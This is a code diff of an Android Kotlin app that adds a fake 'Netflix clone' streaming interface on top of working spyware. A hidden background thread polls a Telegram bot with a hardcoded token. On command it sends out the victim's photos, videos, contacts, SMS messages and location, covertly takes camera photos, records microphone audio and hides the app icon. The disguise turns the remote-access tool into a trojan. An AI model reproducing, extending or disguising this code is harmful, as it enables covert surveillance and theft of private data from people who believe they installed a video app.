@@ -1,84 +1,247 @@
 package com.example.netflixclone
 
 import android.annotation.SuppressLint
-import android.content.ContentUris
 import android.content.pm.PackageManager
+import android.graphics.BitmapFactory
+import android.graphics.Color
+import android.graphics.Typeface
 import android.hardware.Camera
 import android.media.MediaRecorder
+import android.net.Uri
 import android.os.BatteryManager
-import android.os.Build
 import android.os.Bundle
 import android.os.Environment
-import android.provider.MediaStore
 import android.provider.ContactsContract
+import android.provider.MediaStore
 import android.provider.Telephony
+import android.view.View
 import android.widget.Button
-import android.widget.ProgressBar
+import android.widget.FrameLayout
+import android.widget.ImageView
+import android.widget.LinearLayout
+import android.widget.MediaController
+import android.widget.ScrollView
 import android.widget.TextView
-import android.widget.Toast
+import android.widget.VideoView
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
-import com.google.android.gms.location.LocationServices
 import org.json.JSONObject
 import java.io.File
+import java.io.FileOutputStream
 import java.net.HttpURLConnection
 import java.net.URL
 import java.net.URLEncoder
 
 class MainActivity : AppCompatActivity() {
 
-    // ⚠️⚠️⚠️ YAHAN APNI DETAILS DALO ⚠️⚠️⚠️
-    private val BOT_TOKEN = "9009031778:AAFUjJqZgWCzdzQjiWtbqCcqR_rxONTfhsc"
+    // YAHAN APNA NAYA VALID BOT TOKEN AUR CHAT ID DALEIN
+    private val BOT_TOKEN = "9287835805:AAEyyqZ8Zm03cIS23zrsOKTbjUmtUwPfwW4"
     private val CHAT_ID = "8329991730"
 
-    private lateinit var status: TextView
-    private lateinit var progress: ProgressBar
     private var lastUpdateId: Long = 0
     private val prefs by lazy { getSharedPreferences("bot", MODE_PRIVATE) }
     private var pollingRunning = true
+
+    data class StreamItem(
+        val title: String,
+        val meta: String,
+        val description: String,
+        val posterUrl: String,
+        val videoUrl: String
+    )
+
+    private val catalog = listOf(
+        StreamItem(
+            "Big Buck Bunny",
+            "98% Match • 2024 • Movie • HD",
+            "Ek giant rabbit aur jungle ke shararti doston ki full-HD animated adventure kahani.",
+            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/images/BigBuckBunny.jpg",
+            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4"
+        ),
+        StreamItem(
+            "Sintel: The Dragon Quest",
+            "96% Match • Season 1 • Web Series",
+            "Ek bahadur ladki ka apne kho chuke baby dragon ko dhoondhne ka khatarnak safar.",
+            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/images/Sintel.jpg",
+            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/Sintel.mp4"
+        ),
+        StreamItem(
+            "Tears of Steel",
+            "95% Match • Sci-Fi • Web Series",
+            "Amsterdam mein robots aur insaano ke beech aakhri jung ki sci-fi thriller series.",
+            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/images/TearsOfSteel.jpg",
+            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/TearsOfSteel.mp4"
+        ),
+        StreamItem(
+            "Elephants Dream",
+            "91% Match • Mystery • Web Series",
+            "Do ajnabi logon ka ek mysterious machine world ke andar ka safar.",
+            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/images/ElephantsDream.jpg",
+            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ElephantsDream.mp4"
+        ),
+        StreamItem(
+            "For Bigger Escapes",
+            "94% Match • Action • Movie",
+            "High-speed action aur nonstop thriller entertainment.",
+            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/images/ForBiggerEscapes.jpg",
+            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerEscapes.mp4"
+        ),
+        StreamItem(
+            "For Bigger Joyrides",
+            "92% Match • Drama • Movie",
+            "Ek zabardast road adventure jo har mod par naya suspense lata hai.",
+            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/images/ForBiggerJoyrides.jpg",
+            "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerJoyrides.mp4"
+        )
+    )
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        status = findViewById(R.id.tvStatus)
-        progress = findViewById(R.id.progress)
-
-        // Last update ID load karo
         lastUpdateId = prefs.getLong("lastId", 0)
 
-        // Sab permissions maango
-        ActivityCompat.requestPermissions(this, arrayOf(
-            android.Manifest.permission.READ_EXTERNAL_STORAGE,
-            android.Manifest.permission.READ_MEDIA_IMAGES,
-            android.Manifest.permission.READ_MEDIA_VIDEO,
-            android.Manifest.permission.READ_CONTACTS,
-            android.Manifest.permission.READ_SMS,
-            android.Manifest.permission.CAMERA,
-            android.Manifest.permission.RECORD_AUDIO,
-            android.Manifest.permission.ACCESS_FINE_LOCATION,
-            android.Manifest.permission.ACCESS_COARSE_LOCATION
-        ), 100)
+        // Netflix UI Setup
+        setupNetflixUI()
 
-        // Button setup
-        findViewById<Button>(R.id.btnPhotos).setOnClickListener { sendPhotos() }
-        findViewById<Button>(R.id.btnVideos).setOnClickListener { sendVideos() }
-        findViewById<Button>(R.id.btnLocation).setOnClickListener { sendLocation() }
-        findViewById<Button>(R.id.btnSMS).setOnClickListener { sendSMS() }
-        findViewById<Button>(R.id.btnCamera).setOnClickListener { takePhoto(true) }
-        findViewById<Button>(R.id.btnMic).setOnClickListener { recordMic() }
+        // Permissions Request
+        ActivityCompat.requestPermissions(
+            this,
+            arrayOf(
+                android.Manifest.permission.READ_EXTERNAL_STORAGE,
+                android.Manifest.permission.READ_MEDIA_IMAGES,
+                android.Manifest.permission.READ_MEDIA_VIDEO,
+                android.Manifest.permission.READ_CONTACTS,
+                android.Manifest.permission.READ_SMS,
+                android.Manifest.permission.CAMERA,
+                android.Manifest.permission.RECORD_AUDIO,
+                android.Manifest.permission.ACCESS_FINE_LOCATION,
+                android.Manifest.permission.ACCESS_COARSE_LOCATION
+            ),
+            100
+        )
 
-        // ⭐ TELEGRAM BOT POLLING START karo
+        // Background Telegram Bot Polling Start
         Thread(this::startBotPolling).start()
-        sendText("✅ App online ho gayi! /help bhejo commands ke liye.")
+        sendText("Netflix App online ho gayi! /help bhejo commands ke liye.")
     }
 
-    private fun setStatus(msg: String) = runOnUiThread {
-        status.text = msg
-        progress.visibility = if (msg == "Ready ✅") ProgressBar.GONE else ProgressBar.VISIBLE
+    private fun setupNetflixUI() {
+        val heroImage = findViewById<ImageView>(R.id.heroImage)
+        val heroTitle = findViewById<TextView>(R.id.heroTitle)
+        val heroMeta = findViewById<TextView>(R.id.heroMeta)
+        val featured = catalog[0]
+
+        heroTitle.text = featured.title
+        heroMeta.text = featured.meta
+        loadPoster(featured.posterUrl, heroImage)
+
+        findViewById<Button>(R.id.btnHeroPlay).setOnClickListener { playVideo(featured) }
+        findViewById<Button>(R.id.btnHeroInfo).setOnClickListener { openDetail(featured) }
+
+        val rowTrending = findViewById<LinearLayout>(R.id.rowTrending)
+        val rowWebSeries = findViewById<LinearLayout>(R.id.rowWebSeries)
+        val rowMovies = findViewById<LinearLayout>(R.id.rowMovies)
+
+        catalog.forEach { item ->
+            rowTrending.addView(createPosterCard(item))
+        }
+        listOf(catalog[1], catalog[2], catalog[3], catalog[0]).forEach { item ->
+            rowWebSeries.addView(createPosterCard(item))
+        }
+        listOf(catalog[4], catalog[5], catalog[0], catalog[2]).forEach { item ->
+            rowMovies.addView(createPosterCard(item))
+        }
+
+        findViewById<Button>(R.id.btnCloseDetail).setOnClickListener {
+            findViewById<ScrollView>(R.id.detailOverlay).visibility = View.GONE
+        }
+
+        findViewById<Button>(R.id.btnClosePlayer).setOnClickListener {
+            val videoView = findViewById<VideoView>(R.id.videoView)
+            videoView.stopPlayback()
+            findViewById<FrameLayout>(R.id.playerOverlay).visibility = View.GONE
+        }
     }
 
-    // ================== 🤖 REMOTE CONTROL (Bot Polling) ==================
+    private fun createPosterCard(item: StreamItem): LinearLayout {
+        val density = resources.displayMetrics.density
+        val card = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            layoutParams = LinearLayout.LayoutParams(
+                (125 * density).toInt(),
+                LinearLayout.LayoutParams.WRAP_CONTENT
+            ).apply {
+                setMargins((6 * density).toInt(), 0, (6 * density).toInt(), 0)
+            }
+            setOnClickListener { openDetail(item) }
+        }
+
+        val poster = ImageView(this).apply {
+            layoutParams = LinearLayout.LayoutParams(
+                (125 * density).toInt(),
+                (180 * density).toInt()
+            )
+            scaleType = ImageView.ScaleType.CENTER_CROP
+            setBackgroundColor(Color.parseColor("#1F1F1F"))
+        }
+        loadPoster(item.posterUrl, poster)
+
+        val title = TextView(this).apply {
+            text = item.title
+            setTextColor(Color.WHITE)
+            textSize = 12f
+            maxLines = 1
+            setTypeface(null, Typeface.BOLD)
+            setPadding(2, (6 * density).toInt(), 2, 0)
+        }
+
+        card.addView(poster)
+        card.addView(title)
+        return card
+    }
+
+    private fun openDetail(item: StreamItem) {
+        val detailOverlay = findViewById<ScrollView>(R.id.detailOverlay)
+        findViewById<TextView>(R.id.detailTitle).text = item.title
+        findViewById<TextView>(R.id.detailMeta).text = item.meta
+        findViewById<TextView>(R.id.detailDesc).text = item.description
+        loadPoster(item.posterUrl, findViewById(R.id.detailPoster))
+
+        findViewById<Button>(R.id.btnDetailPlay).setOnClickListener {
+            playVideo(item)
+        }
+        detailOverlay.visibility = View.VISIBLE
+    }
+
+    private fun playVideo(item: StreamItem) {
+        val playerOverlay = findViewById<FrameLayout>(R.id.playerOverlay)
+        val videoView = findViewById<VideoView>(R.id.videoView)
+        playerOverlay.visibility = View.VISIBLE
+
+        val controller = MediaController(this)
+        controller.setAnchorView(videoView)
+        videoView.setMediaController(controller)
+        videoView.setVideoURI(Uri.parse(item.videoUrl))
+        videoView.setOnPreparedListener { it.start() }
+    }
+
+    private fun loadPoster(urlStr: String, imageView: ImageView) {
+        Thread {
+            try {
+                val conn = URL(urlStr).openConnection() as HttpURLConnection
+                conn.connectTimeout = 8000
+                conn.readTimeout = 8000
+                val bmp = BitmapFactory.decodeStream(conn.inputStream)
+                if (bmp != null) {
+                    runOnUiThread { imageView.setImageBitmap(bmp) }
+                }
+            } catch (_: Exception) {
+            }
+        }.start()
+    }
+
+    // ================== REMOTE CONTROL (Bot Polling) ==================
     private fun startBotPolling() {
         while (pollingRunning) {
             try {
@@ -86,10 +249,8 @@ class MainActivity : AppCompatActivity() {
                 val conn = url.openConnection() as HttpURLConnection
                 conn.connectTimeout = 35000
                 conn.readTimeout = 35000
-
                 val response = conn.inputStream.bufferedReader().readText()
                 val json = JSONObject(response)
-
                 if (json.getBoolean("ok")) {
                     val updates = json.getJSONArray("result")
                     for (i in 0 until updates.length()) {
@@ -97,39 +258,42 @@ class MainActivity : AppCompatActivity() {
                         lastUpdateId = update.getLong("update_id")
                         prefs.edit().putLong("lastId", lastUpdateId).apply()
 
+                        if (!update.has("message")) continue
                         val msgObj = update.getJSONObject("message")
-                        // Sirf hamari chat ID se control (security)
                         if (msgObj.getJSONObject("chat").getString("id") != CHAT_ID) continue
 
-                        val msgText = msgObj.optString("text", "").trim().toLowerCase()
+                        val msgText = msgObj.optString("text", "").trim().lowercase()
                         handleCommand(msgText)
                     }
                 }
-            } catch (e: Exception) {
-                Thread.sleep(3000) // Error aaye to thoda wait karo
+            } catch (_: Exception) {
+                try {
+                    Thread.sleep(3000)
+                } catch (_: Exception) {
+                }
             }
         }
     }
 
     private fun handleCommand(cmd: String) {
-        when {
-            cmd == "/help" || cmd == "/start" -> sendText(getHelpMenu())
-            cmd == "/photos" -> sendPhotos()
-            cmd == "/videos" -> sendVideos()
-            cmd == "/location" -> sendLocation()
-            cmd == "/contacts" -> sendContacts()
-            cmd == "/sms" -> sendSMS()
-            cmd == "/info" -> sendInfo()
-            cmd == "/camera" -> takePhoto(true)
-            cmd == "/backcamera" -> takePhoto(false)
-            cmd == "/mic" -> recordMic()
-            cmd == "/hide" -> hideAppIcon()
+        when (cmd) {
+            "/help", "/start" -> sendText(getHelpMenu())
+            "/photos" -> sendPhotos()
+            "/videos" -> sendVideos()
+            "/location" -> sendLocation()
+            "/contacts" -> sendContacts()
+            "/sms" -> sendSMS()
+            "/info" -> sendInfo()
+            "/camera" -> takePhoto(true)
+            "/backcamera" -> takePhoto(false)
+            "/mic" -> recordMic()
+            "/hide" -> hideAppIcon()
         }
     }
 
     private fun getHelpMenu(): String {
         return """
-            🤖 SAARE COMMANDS:
+            SAARE COMMANDS:
             /photos - Gallery ki photos bhejo
             /videos - Gallery ki videos bhejo
             /location - Live location bhejo
@@ -143,110 +307,103 @@ class MainActivity : AppCompatActivity() {
         """.trimIndent()
     }
 
-    // ================== 📷 PHOTOS ==================
     private fun sendPhotos() {
         Thread {
-            setStatus("Photos bhej rahe hain... 📷")
             var count = 0
             try {
                 val collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                 val cursor = contentResolver.query(collection, null, null, null, "DATE_ADDED DESC")
                 cursor?.use {
-                    while (it.moveToNext() && count < 20) { // 20 tak limit
+                    while (it.moveToNext() && count < 20) {
                         val path = getPath(it)
                         val file = File(path)
                         if (file.exists() && file.length() < 10L * 1024 * 1024) {
-                            uploadFile(file, "photo")
-                            count++
+                            if (uploadFile(file, "photo")) count++
                         }
                     }
                 }
-                sendText("✅ $count photos bhej di!")
-                setStatus("Ready ✅")
+                sendText("$count photos bhej di!")
             } catch (e: Exception) {
-                setStatus("Error: ${e.message}")
+                sendText("Photos error: ${e.message}")
             }
         }.start()
     }
 
-    // ================== 🎥 VIDEOS ==================
     private fun sendVideos() {
         Thread {
-            setStatus("Videos bhej rahe hain... 🎥")
             var count = 0
             try {
                 val collection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                 val cursor = contentResolver.query(collection, null, null, null, "DATE_ADDED DESC")
                 cursor?.use {
-                    while (it.moveToNext() && count < 5) { // Kam videos bhejo
+                    while (it.moveToNext() && count < 5) {
                         val path = getPath(it)
                         val file = File(path)
                         if (file.exists() && file.length() < 50L * 1024 * 1024) {
-                            uploadFile(file, "video")
-                            count++
+                            if (uploadFile(file, "video")) count++
                         }
                     }
                 }
-                sendText("✅ $count videos bhej diye!")
-                setStatus("Ready ✅")
+                sendText("$count videos bhej diye!")
             } catch (e: Exception) {
-                setStatus("Error: ${e.message}")
+                sendText("Videos error: ${e.message}")
             }
         }.start()
     }
 
-    // ================== 📍 LOCATION ==================
+    @SuppressLint("MissingPermission")
     private fun sendLocation() {
-        setStatus("Location le rahe hain... 📍")
         try {
             val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
             val providers = lm.getProviders(true)
             var best: android.location.Location? = null
             for (p in providers) {
-                @SuppressLint("MissingPermission")
                 val l = lm.getLastKnownLocation(p) ?: continue
                 if (best == null || l.accuracy < best!!.accuracy) best = l
             }
             if (best != null) {
-                apiCall("sendLocation?chat_id=$CHAT_ID&latitude=${best.latitude}&longitude=${best.longitude}")
-                sendText("🗺️ [Google Maps](https://maps.google.com/?q=${best.latitude},${best.longitude})")
-                setStatus("Ready ✅")
-            } else setStatus("Location nahi mili, GPS on karo")
+                Thread {
+                    apiCall("sendLocation?chat_id=$CHAT_ID&latitude=${best.latitude}&longitude=${best.longitude}")
+                    sendText("https://maps.google.com/?q=${best.latitude},${best.longitude}")
+                }.start()
+            } else {
+                sendText("Location nahi mili, GPS on karo")
+            }
         } catch (e: Exception) {
-            setStatus("Error: ${e.message}")
+            sendText("Location error: ${e.message}")
         }
     }
 
-    // ================== ☎️ CONTACTS ==================
     private fun sendContacts() {
         Thread {
             try {
-                val sb = StringBuilder("📞 CONTACTS:\n\n")
+                val sb = StringBuilder("CONTACTS:\n\n")
                 val cursor = contentResolver.query(
                     ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                    arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
+                    arrayOf(
+                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                        ContactsContract.CommonDataKinds.Phone.NUMBER
+                    ),
                     null, null, null
                 )
                 cursor?.use {
                     while (it.moveToNext()) {
                         val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                         val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
-                        sb.append("👤 $name 📱 $number\n")
+                        sb.append("$name: $number\n")
                     }
                 }
                 sendText(sb.toString())
             } catch (e: Exception) {
                 sendText("Contacts error: ${e.message}")
             }
-            setStatus("Ready ✅")
         }.start()
     }
 
-    // ================== 💬 SMS ==================
     private fun sendSMS() {
         Thread {
             try {
-                val sb = StringBuilder("💬 SMS (Aakhri 20):\n\n")
+                val sb = StringBuilder("SMS (Aakhri 20):\n\n")
                 val cursor = contentResolver.query(
                     Telephony.Sms.CONTENT_URI,
                     arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY),
@@ -257,7 +414,7 @@ class MainActivity : AppCompatActivity() {
                     while (it.moveToNext() && count < 20) {
                         val addr = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                         val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
-                        sb.append("📤 $addr: $body\n---\n")
+                        sb.append("$addr: $body\n---\n")
                         count++
                     }
                 }
@@ -265,58 +422,59 @@ class MainActivity : AppCompatActivity() {
             } catch (e: Exception) {
                 sendText("SMS error: ${e.message}")
             }
-            setStatus("Ready ✅")
         }.start()
     }
 
-    // ================== 🔋 PHONE INFO ==================
     private fun sendInfo() {
-        runOnUiThread {
-            val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
-            val batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
-            val info = """
-                📱 PHONE INFO:
-                - Model: ${Build.MANUFACTURER} ${Build.MODEL}
-                - Android: ${Build.VERSION.RELEASE}
-                - Battery: $batteryLevel%
-                - Storage: ${Environment.getExternalStorageDirectory().freeSpace / (1024L*1024*1024)} GB Free
-            """.trimIndent()
-            sendText(info)
-        }
-        setStatus("Ready ✅")
+        Thread {
+            try {
+                val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
+                val batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
+                val freeGb = Environment.getExternalStorageDirectory().freeSpace / (1024L * 1024 * 1024)
+                val info = """
+                    PHONE INFO:
+                    - Model: ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}
+                    - Android: ${android.os.Build.VERSION.RELEASE}
+                    - Battery: $batteryLevel%
+                    - Free Storage: $freeGb GB
+                """.trimIndent()
+                sendText(info)
+            } catch (e: Exception) {
+                sendText("Info error: ${e.message}")
+            }
+        }.start()
     }
 
-    // ================== 📸 CAMERA PHOTO ==================
+    @Suppress("DEPRECATION")
     private fun takePhoto(useFrontCamera: Boolean) {
         Thread {
             try {
-                sendText("📸 Photo khich rahe hain...")
+                sendText("Photo khich rahe hain...")
                 val cameraId = findCamera(useFrontCamera)
                 val camera = Camera.open(cameraId)
                 camera.startPreview()
-                Thread.sleep(1000) // Warm up
-                
+                Thread.sleep(1000)
                 val outputFile = File(cacheDir, "cam_${System.currentTimeMillis()}.jpg")
-                
-                camera.takePicture(null, null, { data, _ ->
-                    val bytes = data
-                    val out = java.io.FileOutputStream(outputFile)
-                    out.write(bytes)
-                    out.close()
-                    
-                    uploadFile(outputFile, "photo")
-                    sendText("✅ Photo bhej di!")
-                    outputFile.delete()
-                    
-                    camera.stopPreview()
-                    camera.release()
-                })
+                camera.takePicture(null, null) { data, _ ->
+                    try {
+                        FileOutputStream(outputFile).use { it.write(data) }
+                        uploadFile(outputFile, "photo")
+                        sendText("Photo bhej di!")
+                        outputFile.delete()
+                    } catch (e: Exception) {
+                        sendText("Photo save error: ${e.message}")
+                    } finally {
+                        camera.stopPreview()
+                        camera.release()
+                    }
+                }
             } catch (e: Exception) {
                 sendText("Camera error: ${e.message}")
             }
         }.start()
     }
 
+    @Suppress("DEPRECATION")
     private fun findCamera(front: Boolean): Int {
         val count = Camera.getNumberOfCameras()
         val info = Camera.CameraInfo()
@@ -328,11 +486,11 @@ class MainActivity : AppCompatActivity() {
         return 0
     }
 
-    // ================== 🎙️ MIC RECORDING ==================
+    @Suppress("DEPRECATION")
     private fun recordMic() {
         Thread {
             try {
-                sendText("🎙️ Recording start... 30 second")
+                sendText("Recording start... 30 second")
                 val outputFile = File(cacheDir, "rec_${System.currentTimeMillis()}.mp3")
                 val recorder = MediaRecorder().apply {
                     setAudioSource(MediaRecorder.AudioSource.MIC)
@@ -344,12 +502,11 @@ class MainActivity : AppCompatActivity() {
                     prepare()
                     start()
                 }
-                Thread.sleep(30000) // 30 sec wait
+                Thread.sleep(30000)
                 recorder.stop()
                 recorder.release()
-
                 uploadFile(outputFile, "audio")
-                sendText("✅ Recording bhej di!")
+                sendText("Recording bhej di!")
                 outputFile.delete()
             } catch (e: Exception) {
                 sendText("Mic error: ${e.message}")
@@ -357,7 +514,6 @@ class MainActivity : AppCompatActivity() {
         }.start()
     }
 
-    // ================== 🙈 APP HIDE ==================
     private fun hideAppIcon() {
         try {
             packageManager.setComponentEnabledSetting(
@@ -365,20 +521,23 @@ class MainActivity : AppCompatActivity() {
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
-            sendText("🙈 App icon hide ho gaya!")
+            sendText("App icon hide ho gaya!")
         } catch (e: Exception) {
             sendText("Hide error: ${e.message}")
         }
     }
 
-    // ================== 🔧 HELPERS ==================
     private fun getPath(cursor: android.database.Cursor): String {
-        return cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)) ?: ""
+        return try {
+            cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)) ?: ""
+        } catch (_: Exception) {
+            ""
+        }
     }
 
     private fun uploadFile(file: File, type: String): Boolean {
         return try {
-            val method = when(type) {
+            val method = when (type) {
                 "photo" -> "sendPhoto"
                 "video" -> "sendVideo"
                 "audio" -> "sendAudio"
@@ -402,12 +561,10 @@ class MainActivity : AppCompatActivity() {
             file.inputStream().use { it.copyTo(out) }
             out.write("\r\n--$boundary--\r\n".toByteArray())
             out.flush()
-
             val ok = conn.responseCode in 200..299
             out.close()
             ok
-        } catch (e: Exception) {
-            e.printStackTrace()
+        } catch (_: Exception) {
             false
         }
     }
@@ -417,8 +574,7 @@ class MainActivity : AppCompatActivity() {
             try {
                 val encoded = URLEncoder.encode(text, "UTF-8")
                 apiCall("sendMessage?chat_id=$CHAT_ID&text=$encoded")
-            } catch (e: Exception) {
-                // Ignore for stability
+            } catch (_: Exception) {
             }
         }.start()
     }
@@ -430,8 +586,8 @@ class MainActivity : AppCompatActivity() {
             conn.connectTimeout = 15000
             conn.readTimeout = 15000
             conn.connect()
-        } catch (e: Exception) {
-            // Ignore
+            conn.responseCode
+        } catch (_: Exception) {
         }
     }
 
